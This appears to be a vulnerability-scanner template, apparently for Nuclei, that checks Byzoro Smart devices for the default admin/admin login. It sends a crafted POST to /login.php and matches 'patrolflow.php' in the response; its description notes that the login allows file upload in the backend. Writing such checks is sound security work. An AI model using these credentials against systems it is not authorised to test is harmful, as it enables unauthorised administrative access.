id: byzoro-smart-default-login
info:
  name: byzoro-smart-default-login
  author: apple
  severity: high
  description: 存在弱口令可以登录后台进行文件上传。
  reference:
    - https://github.com/llixixi/cve/blob/main/s45_upload_%20userattestation.md
  tags: tags
http:
  - raw:
      - |-
        POST /login.php HTTP/1.1
        Host: {{Hostname}}
        Cookie: PHPSESSID=a788fdbfab0fac8c8beb78201336edac
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 113
        Origin: https://{{Hostname}}
        Referer: https://{{Hostname}}/default.php
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Sec-Ch-Ua-Platform: "Windows"
        Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
        Sec-Ch-Ua-Mobile: ?0
        Te: trailers
        Connection: close

        username=admin&pwd=admin&find_username=&selquestion=0&txt_answer=&txt_newpwd=&txt_newpwdconfirm=&mode=login&lang=
    matchers:
      - type: word
        part: body
        words:
          - patrolflow.php
